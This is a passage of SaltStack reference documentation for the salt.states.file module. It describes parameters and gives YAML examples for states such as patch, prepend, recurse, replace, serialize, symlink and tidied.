state argument for supported state functions. It should not be called directly.

salt.states.file.mod\_run\_check\_cmd(*cmd*, *filename*, *\*\*check\_cmd\_opts*)[¶](#salt.states.file.mod_run_check_cmd "Permalink to this definition")

Execute the check\_cmd logic.

Return True if `check_cmd` succeeds (check\_cmd == 0)
otherwise return a result dict

salt.states.file.not\_cached(*name*, *saltenv='base'*)[¶](#salt.states.file.not_cached "Permalink to this definition")

New in version 2017.7.3.

Ensures that a file is not present in the minion's cache, deleting it
if found. This state is primarily invoked by other states to ensure
that a fresh copy is fetched.

name

The URL of the file to be removed from cache. To remove a file from
cache in an environment other than `base`, either use the `saltenv`
argument or include the saltenv in the URL (e.g.
`salt://path/to/file.conf?saltenv=dev`).

Note

A list of URLs is not supported, this must be a single URL. If a
local file is passed here, the state will take no action.

saltenv

Used to specify the environment from which to download a file from the
Salt fileserver (i.e. those with `salt://` URL).

salt.states.file.patch(*name*, *source=None*, *source\_hash=None*, *source\_hash\_name=None*, *skip\_verify=False*, *template=None*, *context=None*, *defaults=None*, *options=''*, *reject\_file=None*, *strip=None*, *saltenv=None*, *\*\*kwargs*)[¶](#salt.states.file.patch "Permalink to this definition")

Ensure that a patch has been applied to the specified file or directory

Changed in version 2019.2.0: The `hash` and `dry_run_first` options are now ignored, as the
logic which determines whether or not the patch has already been
applied no longer requires them. Additionally, this state now supports
patch files that modify more than one file. To use these sort of
patches, specify a directory (and, if necessary, the `strip` option)
instead of a file.

Note

A suitable `patch` executable must be available on the minion. Also,
keep in mind that the pre-check this state does to determine whether or
not changes need to be made will create a temp file and send all patch
output to that file. This means that, in the event that the patch would
not have applied cleanly, the comment included in the state results will
reference a temp file that will no longer exist once the state finishes
running.

name

The file or directory to which the patch should be applied

source

The patch file to apply

Changed in version 2019.2.0: The source can now be from any file source supported by Salt
(`salt://`, `http://`, `https://`, `ftp://`, etc.).
Templating is also now supported.

source\_hash

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed").

New in version 2019.2.0.

source\_hash\_name

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed")

New in version 2019.2.0.

skip\_verify

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed")

New in version 2019.2.0.

template

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed")

New in version 2019.2.0.

context

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed")

New in version 2019.2.0.

defaults

Works the same way as in [`file.managed`](#salt.states.file.managed "salt.states.file.managed")

New in version 2019.2.0.

options

Extra options to pass to patch. This should not be necessary in most
cases.

Note

For best results, short opts should be separate from one another.
The `-N` and `-r`, and `-o` options are used internally by
this state and cannot be used here. Additionally, instead of using
`-pN` or `--strip=N`, use the `strip` option documented
below.

reject\_file

If specified, any rejected hunks will be written to this file. If not
specified, then they will be written to a temp file which will be
deleted when the state finishes running.

Important

The parent directory must exist. Also, this will overwrite the file
if it is already present.

New in version 2019.2.0.

strip

Number of directories to strip from paths in the patch file. For
example, using the below SLS would instruct Salt to use `-p1` when
applying the patch:

```
/etc/myfile.conf:
  file.patch:
    - source: salt://myfile.patch
    - strip: 1

```

New in version 2019.2.0: In previous versions, `-p1` would need to be passed as part of
the `options` value.

saltenv

Specify the environment from which to retrieve the patch file indicated
by the `source` parameter. If not provided, this defaults to the
environment from which the state is being executed.

Note

Ignored when the patch file is from a non-`salt://` source.

**Usage:**

```
# Equivalent to ``patch --forward /opt/myfile.txt myfile.patch``
/opt/myfile.txt:
  file.patch:
    - source: salt://myfile.patch

```

salt.states.file.prepend(*name*, *text=None*, *makedirs=False*, *source=None*, *source\_hash=None*, *template='jinja'*, *sources=None*, *source\_hashes=None*, *defaults=None*, *context=None*, *header=None*)[¶](#salt.states.file.prepend "Permalink to this definition")

Ensure that some text appears at the beginning of a file

The text will not be prepended again if it already exists in the file. You
may specify a single line of text or a list of lines to append.

name

The location of the file to prepend to.

text

The text to be prepended, which can be a single string or a list
of strings.

makedirs

If the file is located in a path without a parent directory,
then the state will fail. If makedirs is set to True, then
the parent directories will be created to facilitate the
creation of the named file. Defaults to False.

source

A single source file to prepend. This source file can be hosted on either
the salt master server, or on an HTTP or FTP server. Both HTTPS and
HTTP are supported as well as downloading directly from Amazon S3
compatible URLs with both pre-configured and automatic IAM credentials
(see s3.get state documentation). File retrieval from Openstack Swift
object storage is supported via swift://container/object\_path URLs
(see swift.get documentation).

For files hosted on the salt file server, if the file is located on
the master in the directory named spam, and is called eggs, the source
string is salt://spam/eggs.

If the file is hosted on an HTTP or FTP server, the source\_hash argument
is also required.

source\_hash
This can be one of the following:

1. a source hash string
2. the URI of a file that contains source hash strings

The function accepts the first encountered long unbroken alphanumeric
string of correct length as a valid hash, in order from most secure to
least secure:

```
Type    Length
======  ======
sha512     128
sha384      96
sha256      64
sha224      56
sha1        40
md5         32

```

See the `source_hash` parameter description for [`file.managed`](#salt.states.file.managed "salt.states.file.managed") function for more details and examples.

template

The named templating engine will be used to render the source file(s).
Defaults to `jinja`. The following templates are supported:

* [`cheetah`](../../renderers/all/salt.renderers.cheetah.html#module-salt.renderers.cheetah "salt.renderers.cheetah")
* [`genshi`](../../renderers/all/salt.renderers.genshi.html#module-salt.renderers.genshi "salt.renderers.genshi")
* [`jinja`](../../renderers/all/salt.renderers.jinja.html#module-salt.renderers.jinja "salt.renderers.jinja")
* [`mako`](../../renderers/all/salt.renderers.mako.html#module-salt.renderers.mako "salt.renderers.mako")
* [`py`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py")
* [`wempy`](../../renderers/all/salt.renderers.wempy.html#module-salt.renderers.wempy "salt.renderers.wempy")

sources

A list of source files to prepend. If the files are hosted on an HTTP or
FTP server, the source\_hashes argument is also required.

source\_hashes

A list of source\_hashes corresponding to the sources list specified in
the sources argument.

defaults

Default context passed to the template.

context

Overrides default context variables passed to the template.

ignore\_whitespace

New in version 2015.8.4.

Spaces and Tabs in text are ignored by default, when searching for the
appending content, one space or multiple tabs are the same for salt.
Set this option to `False` if you want to change this behavior.

header

Forces the text to be prepended. If it exists in the file but not at
the beginning, then it prepends a duplicate.

Multi-line example:

```
/etc/motd:
  file.prepend:
    - text: |
        Thou hadst better eat salt with the Philosophers of Greece,
        than sugar with the Courtiers of Italy.
        - Benjamin Franklin

```

Multiple lines of text:

```
/etc/motd:
  file.prepend:
    - text:
      - Trust no one unless you have eaten much salt with him.
      - "Salt is born of the purest of parents: the sun and the sea."

```

Optionally, require the text to appear exactly as specified
(order and position). Combine with multi-line or multiple lines of input.

```
/etc/motd:
  file.prepend:
    - header: True
    - text:
      - This will be the very first line in the file.
      - The 2nd line, regardless of duplicates elsewhere in the file.
      - These will be written anew if they do not appear verbatim.

```

Gather text from multiple template files:

```
/etc/motd:
  file:
    - prepend
    - template: jinja
    - sources:
      - salt://motd/devops-messages.tmpl
      - salt://motd/hr-messages.tmpl
      - salt://motd/general-messages.tmpl

```

New in version 2014.7.0.

salt.states.file.pruned(*name*, *recurse=False*, *ignore\_errors=False*, *older\_than=None*)[¶](#salt.states.file.pruned "Permalink to this definition")

New in version 3006.0.

Ensure that the named directory is absent. If it exists and is empty, it
will be deleted. An entire directory tree can be pruned of empty
directories as well, by using the `recurse` option.

name

The directory which should be deleted if empty.

recurse

If set to `True`, this option will recursive deletion of empty
directories. This is useful if nested paths are all empty, and would
be the only items preventing removal of the named root directory.

ignore\_errors

If set to `True`, any errors encountered while attempting to delete a
directory are ignored. This **AUTOMATICALLY ENABLES** the `recurse`
option since it's not terribly useful to ignore errors on the removal of
a single directory. Useful for pruning only the empty directories in a
tree which contains non-empty directories as well.

older\_than

When `older_than` is set to a number, it is used to determine the
**number of days** which must have passed since the last modification
timestamp before a directory will be allowed to be removed. Setting
the value to 0 is equivalent to leaving it at the default of `None`.

salt.states.file.recurse(*name*, *source*, *keep\_source=True*, *clean=False*, *require=None*, *user=None*, *group=None*, *dir\_mode=None*, *file\_mode=None*, *sym\_mode=None*, *template=None*, *context=None*, *replace=True*, *defaults=None*, *include\_empty=False*, *backup=''*, *include\_pat=None*, *exclude\_pat=None*, *maxdepth=None*, *keep\_symlinks=False*, *force\_symlinks=False*, *win\_owner=None*, *win\_perms=None*, *win\_deny\_perms=None*, *win\_inheritance=True*, *\*\*kwargs*)[¶](#salt.states.file.recurse "Permalink to this definition")

Recurse through a subdirectory on the master and copy said subdirectory
over to the specified path.

name

The directory to set the recursion in

source

The source directory, this directory is located on the salt master file
server and is specified with the salt:// protocol. If the directory is
located on the master in the directory named spam, and is called eggs,
the source string is salt://spam/eggs

keep\_source

Set to `False` to discard the cached copy of the source file once the
state completes. This can be useful for larger files to keep them from
taking up space in minion cache. However, keep in mind that discarding
the source file will result in the state needing to re-download the
source file if the state is run again.

New in version 2017.7.3.

clean

Make sure that only files that are set up by salt and required by this
function are kept. If this option is set then everything in this
directory will be deleted unless it is required.

require

Require other resources such as packages or files

user

The user to own the directory. This defaults to the user salt is
running as on the minion

group

The group ownership set for the directory. This defaults to the group
salt is running as on the minion. On Windows, this is ignored

dir\_mode

The permissions mode to set on any directories created.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

Note

This option is **not** supported on Windows.

file\_mode

The permissions mode to set on any files created.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

Note

This option is **not** supported on Windows.

Changed in version 2016.11.0: This option can be set to `keep`, and Salt will keep the mode
from the Salt fileserver. This is only supported when the
`source` URL begins with `salt://`, or for files local to the
minion. Because the `source` option cannot be used with any of
the `contents` options, setting the `mode` to `keep` is also
incompatible with the `contents` options.

sym\_mode

The permissions mode to set on any symlink created.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

Note

This option is **not** supported on Windows.

template

If this setting is applied, the named templating engine will be used to
render the downloaded file. The following templates are supported:

* [`cheetah`](../../renderers/all/salt.renderers.cheetah.html#module-salt.renderers.cheetah "salt.renderers.cheetah")
* [`genshi`](../../renderers/all/salt.renderers.genshi.html#module-salt.renderers.genshi "salt.renderers.genshi")
* [`jinja`](../../renderers/all/salt.renderers.jinja.html#module-salt.renderers.jinja "salt.renderers.jinja")
* [`mako`](../../renderers/all/salt.renderers.mako.html#module-salt.renderers.mako "salt.renderers.mako")
* [`py`](../../renderers/all/salt.renderers.py.html#module-salt.renderers.py "salt.renderers.py")
* [`wempy`](../../renderers/all/salt.renderers.wempy.html#module-salt.renderers.wempy "salt.renderers.wempy")

Note

The template option is required when recursively applying templates.

replace

If set to `False` and the file already exists, the file will not be
modified even if changes would otherwise be made. Permissions and
ownership will still be enforced, however.

context

Overrides default context variables passed to the template.

defaults

Default context passed to the template.

include\_empty

Set this to True if empty directories should also be created
(default is False)

backup

Overrides the default backup mode for all replaced files. See
[backup\_mode documentation](../backup_mode.html#file-state-backups) for more details.

include\_pat

When copying, include only this pattern, or list of patterns, from the
source. Default is glob match; if prefixed with 'E@', then regexp match.
Example:

```
- include_pat: hello*       :: glob matches 'hello01', 'hello02'
                               ... but not 'otherhello'
- include_pat: E@hello      :: regexp matches 'otherhello',
                               'hello01' ...

```

Changed in version 3001: List patterns are now supported

```
- include_pat:
    - hello01
    - hello02

```

exclude\_pat

Exclude this pattern, or list of patterns, from the source when copying.
If both include\_pat and exclude\_pat are supplied, then it will apply
conditions cumulatively. i.e. first select based on include\_pat, and
then within that result apply exclude\_pat.

Also, when 'clean=True', exclude this pattern from the removal
list and preserve in the destination.
Example:

```
- exclude_pat: APPDATA*               :: glob matches APPDATA.01,
                                         APPDATA.02,.. for exclusion
- exclude_pat: E@(APPDATA)|(TEMPDATA) :: regexp matches APPDATA
                                         or TEMPDATA for exclusion

```

Changed in version 3001: List patterns are now supported

```
- exclude_pat:
    - APPDATA.01
    - APPDATA.02

```

maxdepth

When copying, only copy paths which are of depth maxdepth from the
source path.
Example:

```
- maxdepth: 0      :: Only include files located in the source
                      directory
- maxdepth: 1      :: Only include files located in the source
                      or immediate subdirectories

```

keep\_symlinks

Keep symlinks when copying from the source. This option will cause
the copy operation to terminate at the symlink. If desire behavior
similar to rsync, then set this to True. This option is not taken
in account if `fileserver_followsymlinks` is set to False.

force\_symlinks

Force symlink creation. This option will force the symlink creation.
If a file or directory is obstructing symlink creation it will be
recursively removed so that symlink creation can proceed. This
option is usually not needed except in special circumstances. This
option is not taken in account if `fileserver_followsymlinks` is
set to False.

win\_owner

The owner of the symlink and directories if `makedirs` is True. If
this is not passed, `user` will be used. If `user` is not passed,
the account under which Salt is running will be used.

New in version 2017.7.7.

win\_perms

A dictionary containing permissions to grant

New in version 2017.7.7.

win\_deny\_perms

A dictionary containing permissions to deny

New in version 2017.7.7.

win\_inheritance

True to inherit permissions from parent, otherwise False

New in version 2017.7.7.

salt.states.file.rename(*name*, *source*, *force=False*, *makedirs=False*, *\*\*kwargs*)[¶](#salt.states.file.rename "Permalink to this definition")

If the source file exists on the system, rename it to the named file. The
named file will not be overwritten if it already exists unless the force
option is set to True.

name

The location of the file to rename to

source

The location of the file to move to the location specified with name

force

If the target location is present then the file will not be moved,
specify "force: True" to overwrite the target file

makedirs

If the target subdirectories don't exist create them

salt.states.file.replace(*name*, *pattern*, *repl*, *count=0*, *flags=8*, *bufsize=1*, *append\_if\_not\_found=False*, *prepend\_if\_not\_found=False*, *not\_found\_content=None*, *backup='.bak'*, *show\_changes=True*, *ignore\_if\_missing=False*, *backslash\_literal=False*)[¶](#salt.states.file.replace "Permalink to this definition")

Maintain an edit in a file.

New in version 0.17.0.

name

Filesystem path to the file to be edited. If a symlink is specified, it
will be resolved to its target.

pattern

A regular expression, to be matched using Python's
[`re.search()`](https://docs.python.org/3/library/re.html#re.search "(in Python v3.13)").

Note

If you need to match a literal string that contains regex special
characters, you may want to use salt's custom Jinja filter,
`regex_escape`.

```
{{ 'http://example.com?foo=bar%20baz' | regex_escape }}

```

repl

The replacement text

count

Maximum number of pattern occurrences to be replaced. Defaults to 0.
If count is a positive integer n, no more than n occurrences will be
replaced, otherwise all occurrences will be replaced.

flags

A list of flags defined in the `re` module documentation from the
Python standard library. Each list item should be a string that will
correlate to the human-friendly flag name. E.g., `['IGNORECASE',
'MULTILINE']`. Optionally, `flags` may be an int, with a value
corresponding to the XOR (`|`) of all the desired flags. Defaults to
`8` (which equates to `['MULTILINE']`).

Note

`file.replace` reads the entire file as a string to support
multiline regex patterns. Therefore, when using anchors such as
`^` or `$` in the pattern, those anchors may be relative to
the line OR relative to the file. The default for `file.replace`
is to treat anchors as relative to the line, which is implemented
by setting the default value of `flags` to `['MULTILINE']`.
When overriding the default value for `flags`, if
`'MULTILINE'` is not present then anchors will be relative to
the file. If the desired behavior is for anchors to be relative to
the line, then simply add `'MULTILINE'` to the list of flags.

bufsize

How much of the file to buffer into memory at once. The default value
`1` processes one line at a time. The special value `file` may be
specified which will read the entire file into memory before
processing.

append\_if\_not\_found

If set to `True`, and pattern is not found, then the content will be
appended to the file.

New in version 2014.7.0.

prepend\_if\_not\_found

If set to `True` and pattern is not found, then the content will be
prepended to the file.

New in version 2014.7.0.

not\_found\_content

Content to use for append/prepend if not found. If `None` (default),
uses `repl`. Useful when `repl` uses references to group in
pattern.

New in version 2014.7.0.

backup

The file extension to use for a backup of the file before editing. Set
to `False` to skip making a backup.

show\_changes

Output a unified diff of the old file and the new file. If `False`
return a boolean if any changes were made. Returns a boolean or a
string.

ignore\_if\_missing

New in version 2016.3.4.

Controls what to do if the file is missing. If set to `False`, the
state will display an error raised by the execution module. If set to
`True`, the state will simply report no changes.

backslash\_literal

New in version 2016.11.7.

Interpret backslashes as literal backslashes for the repl and not
escape characters. This will help when using append/prepend so that
the backslashes are not interpreted for the repl on the second run of
the state.

For complex regex patterns, it can be useful to avoid the need for complex
quoting and escape sequences by making use of YAML's multiline string
syntax.

```
complex_search_and_replace:
  file.replace:
    # <...snip...>
    - pattern: |
        CentOS \(2.6.32[^\\n]+\\n\s+root[^\\n]+\\n\)+

```

Note

When using YAML multiline string syntax in `pattern:`, make sure to
also use that syntax in the `repl:` part, or you might loose line
feeds.

When regex capture groups are used in `pattern:`, their captured value is
available for reuse in the `repl:` part as a backreference (ex. `\1`).

```
add_login_group_to_winbind_ssh_access_list:
  file.replace:
    - name: '/etc/security/pam_winbind.conf'
    - pattern: '^(require_membership_of = )(.*)$'
    - repl: '\1\2,append-new-group-to-line'

```

Note

The `file.replace` state uses Python's `re` module.
For more advanced options, see <https://docs.python.org/2/library/re.html>

salt.states.file.retention\_schedule(*name*, *retain*, *strptime\_format=None*, *timezone=None*)[¶](#salt.states.file.retention_schedule "Permalink to this definition")

Apply retention scheduling to backup storage directory.

New in version 2016.11.0.

Changed in version 3006.0.

Parameters:

* **name** -- The filesystem path to the directory containing backups to be managed.
* **retain** --

  Delete the backups, except for the ones we want to keep.
  The N below should be an integer but may also be the special value of `all`,
  which keeps all files matching the criteria.
  All of the retain options default to None,
  which means to not keep files based on this criteria.

  most\_recent N:

  Keep the most recent N files.

  first\_of\_hour N:

  For the last N hours from now, keep the first file after the hour.

  first\_of\_day N:

  For the last N days from now, keep the first file after midnight.
  See also `timezone`.

  first\_of\_week N:

  For the last N weeks from now, keep the first file after Sunday midnight.

  first\_of\_month N:

  For the last N months from now, keep the first file after the start of the month.

  first\_of\_year N:

  For the last N years from now, keep the first file after the start of the year.
* **strptime\_format** -- A python strptime format string used to first match the filenames of backups
  and then parse the filename to determine the datetime of the file.
  <https://docs.python.org/2/library/datetime.html#datetime.datetime.strptime>
  Defaults to None, which considers all files in the directory to be backups eligible for deletion
  and uses `os.path.getmtime()` to determine the datetime.
* **timezone** -- The timezone to use when determining midnight.
  This is only used when datetime is pulled from `os.path.getmtime()`.
  Defaults to `None` which uses the timezone from the locale.

Usage example:

```
/var/backups/example_directory:
  file.retention_schedule:
    - retain:
        most_recent: 5
        first_of_hour: 4
        first_of_day: 7
        first_of_week: 6    # NotImplemented yet.
        first_of_month: 6
        first_of_year: all
    - strptime_format: example_name_%Y%m%dT%H%M%S.tar.bz2
    - timezone: None

```

salt.states.file.serialize(*name*, *dataset=None*, *dataset\_pillar=None*, *user=None*, *group=None*, *mode=None*, *backup=''*, *makedirs=False*, *show\_changes=True*, *create=True*, *merge\_if\_exists=False*, *encoding=None*, *encoding\_errors='strict'*, *serializer=None*, *serializer\_opts=None*, *deserializer\_opts=None*, *check\_cmd=None*, *tmp\_dir=''*, *tmp\_ext=''*, *\*\*kwargs*)[¶](#salt.states.file.serialize "Permalink to this definition")

Serializes dataset and store it into managed file. Useful for sharing
simple configuration files.

name

The location of the file to create

dataset

The dataset that will be serialized

dataset\_pillar

Operates like `dataset`, but draws from a value stored in pillar,
using the pillar path syntax used in [`pillar.get`](../../modules/all/salt.modules.pillar.html#salt.modules.pillar.get "salt.modules.pillar.get"). This is useful when the pillar value
contains newlines, as referencing a pillar variable using a jinja/mako
template can result in YAML formatting issues due to the newlines
causing indentation mismatches.

New in version 2015.8.0.

Note

For information on using Salt Slots and how to incorporate
execution module returns into file content or data, refer to the
[Salt Slots documentation](https://docs.saltproject.io/en/latest/topics/slots/index.html).

serializer (or formatter)

Write the data as this format. See the list of
[serializer modules](../../serializers/all/index.html#all-salt-serializers) for supported output formats.

Changed in version 3002: `serializer` argument added as an alternative to `formatter`.
Both are accepted, but using both will result in an error.

encoding

If specified, then the specified encoding will be used. Otherwise, the
file will be encoded using the system locale (usually UTF-8). See
<https://docs.python.org/3/library/codecs.html#standard-encodings> for
the list of available encodings.

New in version 2017.7.0.

encoding\_errors

Error encoding scheme. Default is ``'strict'``.
See <https://docs.python.org/2/library/codecs.html#codec-base-classes>
for the list of available schemes.

New in version 2017.7.0.

user

The user to own the directory, this defaults to the user salt is
running as on the minion

group

The group ownership set for the directory, this defaults to the group
salt is running as on the minion

mode

The permissions to set on this file, e.g. `644`, `0775`, or
`4664`.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

Note

This option is **not** supported on Windows.

backup

Overrides the default backup mode for this specific file.

makedirs

Create parent directories for destination file.

New in version 2014.1.3.

show\_changes

Output a unified diff of the old file and the new file. If `False`
return a boolean if any changes were made.

create

Default is True, if create is set to False then the file will only be
managed if the file already exists on the system.

merge\_if\_exists

Default is False, if merge\_if\_exists is True then the existing file will
be parsed and the dataset passed in will be merged with the existing
content

New in version 2014.7.0.

serializer\_opts

Pass through options to serializer. For example:

```
/etc/dummy/package.yaml
  file.serialize:
    - serializer: yaml
    - serializer_opts:
      - explicit_start: True
      - default_flow_style: True
      - indent: 4

```

The valid opts are the additional opts (i.e. not the data being
serialized) for the function used to serialize the data. Documentation
for the these functions can be found in the list below:

* For **yaml**: [yaml.dump()](https://pyyaml.org/wiki/PyYAMLDocumentation)
* For **json**: [json.dumps()](https://docs.python.org/2/library/json.html#json.dumps)
* For **python**: [pprint.pformat()](https://docs.python.org/2/library/pprint.html#pprint.pformat)
* For **msgpack**: Run `python -c 'import msgpack; help(msgpack.Packer)'`
  to see the available options (`encoding`, `unicode_errors`, etc.)

deserializer\_opts

Like `serializer_opts` above, but only used when merging with an
existing file (i.e. when `merge_if_exists` is set to `True`).

The options specified here will be passed to the deserializer to load
the existing data, before merging with the specified data and
re-serializing.

```
/etc/dummy/package.yaml
  file.serialize:
    - serializer: yaml
    - serializer_opts:
      - explicit_start: True
      - default_flow_style: True
      - indent: 4
    - deserializer_opts:
      - encoding: latin-1
    - merge_if_exists: True

```

The valid opts are the additional opts (i.e. not the data being
deserialized) for the function used to deserialize the data.
Documentation for the these functions can be found in the list below:

* For **yaml**: [yaml.load()](https://pyyaml.org/wiki/PyYAMLDocumentation)
* For **json**: [json.loads()](https://docs.python.org/2/library/json.html#json.loads)

However, note that not all arguments are supported. For example, when
deserializing JSON, arguments like `parse_float` and `parse_int`
which accept a callable object cannot be handled in an SLS file.

New in version 2019.2.0.

check\_cmd

The specified command will be run with an appended argument of a
*temporary* file containing the new file contents. If the command
exits with a zero status the new file contents will be written to
the state output destination. If the command exits with a nonzero exit
code, the state will fail and no changes will be made to the file.

For example, the following could be used to verify sudoers before making
changes:

```
/etc/consul.d/my_config.json:
  file.serialize:
    - dataset:
        datacenter: "east-aws"
        data_dir: "/opt/consul"
        log_level: "INFO"
        node_name: "foobar"
        server: true
        watches:
          - type: checks
            handler: "/usr/bin/health-check-handler.sh"
        telemetry:
          statsite_address: "127.0.0.1:2180"
    - serializer: json
    - check_cmd: consul validate

```

**NOTE**: This `check_cmd` functions differently than the requisite
`check_cmd`.

New in version 3007.0.

tmp\_dir

Directory for temp file created by `check_cmd`. Useful for checkers
dependent on config file location (e.g. daemons restricted to their
own config directories by an apparmor profile).

New in version 3007.0.

tmp\_ext

Suffix for temp file created by `check_cmd`. Useful for checkers
dependent on config file extension.

New in version 3007.0.

For example, this state:

```
/etc/dummy/package.json:
  file.serialize:
    - dataset:
        name: naive
        description: A package using naive versioning
        author: A confused individual <iam@confused.com>
        dependencies:
          express: '>= 1.2.0'
          optimist: '>= 0.1.0'
        engine: node 0.4.1
    - serializer: json

```

will manage the file `/etc/dummy/package.json`:

```
{
  "author": "A confused individual <iam@confused.com>",
  "dependencies": {
    "express": ">= 1.2.0",
    "optimist": ">= 0.1.0"
  },
  "description": "A package using naive versioning",
  "engine": "node 0.4.1",
  "name": "naive"
}

```

salt.states.file.shortcut(*name*, *target*, *arguments=None*, *working\_dir=None*, *description=None*, *icon\_location=None*, *force=False*, *backupname=None*, *makedirs=False*, *user=None*, *\*\*kwargs*)[¶](#salt.states.file.shortcut "Permalink to this definition")

Create a Windows shortcut

If the file already exists and is a shortcut pointing to any location other
than the specified target, the shortcut will be replaced. If it is
a regular file or directory then the state will return False. If the
regular file or directory is desired to be replaced with a shortcut pass
force: True, if it is to be renamed, pass a backupname.

name

The location of the shortcut to create. Must end with either
".lnk" or ".url"

target

The location that the shortcut points to

arguments

Any arguments to pass in the shortcut

working\_dir

Working directory in which to execute target

description

Description to set on shortcut

icon\_location

Location of shortcut's icon

force

If the name of the shortcut exists and is not a file and
force is set to False, the state will fail. If force is set to
True, the link or directory in the way of the shortcut file
will be deleted to make room for the shortcut, unless
backupname is set, when it will be renamed

backupname

If the name of the shortcut exists and is not a file, it will be
renamed to the backupname. If the backupname already
exists and force is False, the state will fail. Otherwise, the
backupname will be removed first.

makedirs

If the location of the shortcut does not already have a parent
directory then the state will fail, setting makedirs to True will
allow Salt to create the parent directory. Setting this to True will
also create the parent for backupname if necessary.

user

The user to own the file, this defaults to the user salt is running as
on the minion

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

salt.states.file.symlink(*name*, *target*, *force=False*, *backupname=None*, *makedirs=False*, *user=None*, *group=None*, *mode=None*, *win\_owner=None*, *win\_perms=None*, *win\_deny\_perms=None*, *win\_inheritance=None*, *atomic=False*, *disallow\_copy\_and\_unlink=False*, *inherit\_user\_and\_group=False*, *follow\_symlinks=True*, *\*\*kwargs*)[¶](#salt.states.file.symlink "Permalink to this definition")

Create a symbolic link (symlink, soft link)

If the file already exists and is a symlink pointing to any location other
than the specified target, the symlink will be replaced. If an entry with
the same name exists then the state will return False. If the existing
entry is desired to be replaced with a symlink pass force: True, if it is
to be renamed, pass a backupname.

name

The location of the symlink to create

target

The location that the symlink points to

force

If the name of the symlink exists and is not a symlink and
force is set to False, the state will fail. If force is set to
True, the existing entry in the way of the symlink file
will be deleted to make room for the symlink, unless
backupname is set, when it will be renamed

Changed in version 3000: Force will now remove all types of existing file system entries,
not just files, directories and symlinks.

backupname

If the name of the symlink exists and is not a symlink, it will be
renamed to the backupname. If the backupname already
exists and force is False, the state will fail. Otherwise, the
backupname will be removed first.
An absolute path OR a basename file/directory name must be provided.
The latter will be placed relative to the symlink destination's parent
directory.

makedirs

If the location of the symlink does not already have a parent directory
then the state will fail, setting makedirs to True will allow Salt to
create the parent directory

user

The user to own the file, this defaults to the user salt is running as
on the minion unless the link already exists and
`inherit_user_and_group` is set

group

The group ownership set for the file, this defaults to the group salt
is running as on the minion unless the link already exists and
`inherit_user_and_group` is set. On Windows, this is ignored

mode

The permissions to set on this file, aka 644, 0775, 4664. Not supported
on Windows.

The default mode for new files and directories corresponds umask of salt
process. For existing files and directories it's not enforced.

win\_owner

The owner of the symlink and directories if `makedirs` is True. If
this is not passed, `user` will be used. If `user` is not passed,
the account under which Salt is running will be used.

New in version 2017.7.7.

win\_perms

A dictionary containing permissions to grant

New in version 2017.7.7.

win\_deny\_perms

A dictionary containing permissions to deny

New in version 2017.7.7.

win\_inheritance

True to inherit permissions from parent, otherwise False

New in version 2017.7.7.

atomic

Use atomic file operation to create the symlink.

New in version 3006.0.

disallow\_copy\_and\_unlink

Only used if `backupname` is used and the name of the symlink exists
and is not a symlink. If set to `True`, the operation is offloaded to
the `file.rename` execution module function. This will use
`os.rename` underneath, which will fail in the event that `src` and
`dst` are on different filesystems. If `False` (the default),
`shutil.move` will be used in order to fall back on a "copy then
unlink" approach, which is required for moving across filesystems.

New in version 3006.0.

inherit\_user\_and\_group

If set to `True`, the link already exists, and either `user` or
`group` are not set, this parameter will inform Salt to pull the user
and group information from the existing link and use it where `user`
or `group` is not set. The `user` and `group` parameters will
override this behavior.

New in version 3006.0.

follow\_symlinks (bool):

If set to `False`, the underlying `file.symlink` execution module
and any checks in this state will use `os.path.lexists()` for
existence checks instead of `os.path.exists()`.

New in version 3007.0.

salt.states.file.tidied(*name*, *age=0*, *matches=None*, *rmdirs=False*, *size=0*, *exclude=None*, *full\_path\_match=False*, *followlinks=False*, *time\_comparison='atime'*, *age\_size\_logical\_operator='OR'*, *age\_size\_only=None*, *rmlinks=True*, *\*\*kwargs*)[¶](#salt.states.file.tidied "Permalink to this definition")

Changed in version 3005,3006.0.

Remove unwanted files based on specific criteria.

The default operation uses an OR operation to evaluate age and size, so a
file that is too large but is not old enough will still get tidied. If
neither age nor size is given all files which match a pattern in matches
will be removed.

NOTE: The regex patterns in this function are used in `re.match()`, so
there is an implicit "beginning of string" anchor (`^`) in the regex and
it is unanchored at the other end unless explicitly entered (`$`).

name

The directory tree that should be tidied

age

Maximum age in days after which files are considered for removal

matches

List of regular expressions to restrict what gets removed. Default: ['.\*']

rmdirs

Whether or not it's allowed to remove directories

size

Maximum allowed file size. Files greater or equal to this size are
removed. Doesn't apply to directories or symbolic links

exclude

List of regular expressions to filter the `matches` parameter and better
control what gets removed.

New in version 3005.

full\_path\_match

Match the `matches` and `exclude` regex patterns against the entire
file path instead of just the file or directory name. Default: `False`

New in version 3005.

followlinks

This module will not descend into subdirectories which are pointed to by
symbolic links. If you wish to force it to do so, you may give this
option the value `True`. Default: `False`

New in version 3005.

time\_comparison

Default: `atime`. Options: `atime`/`mtime`/`ctime`. This value
is used to set the type of time comparison made using `age`. The
default is to compare access times (atime) or the last time the file was
read. A comparison by modification time (mtime) uses the last time the
contents of the file was changed. The ctime parameter is the last time
the contents, owner, or permissions of the file were changed.

New in version 3005.

age\_size\_logical\_operator

This parameter can change the default operation (OR) to an AND operation
to evaluate age and size. In that scenario, a file that is too large but
is not old enough will NOT get tidied. A file will need to fulfill BOTH
conditions in order to be tidied. Accepts `OR` or `AND`.

New in version 3006.0.

age\_size\_only

This parameter can trigger the reduction of age and size conditions
which need to be satisfied down to ONLY age or ONLY size. By default,
this parameter is `None` and both conditions will be evaluated using
the logical operator defined in `age_size_logical_operator`. The
parameter can be set to `age` or `size` in order to restrict
evaluation down to that specific condition. Path matching and
exclusions still apply.

New in version 3006.0.

rmlinks

Whether or not it's allowed to remove symbolic links

New in version 3006.0.

```
cleanup:
  file.tidied:
    - name: /tmp/salt_test
    - rmdirs: True
    - matches:
      - foo
      - b.*r

```

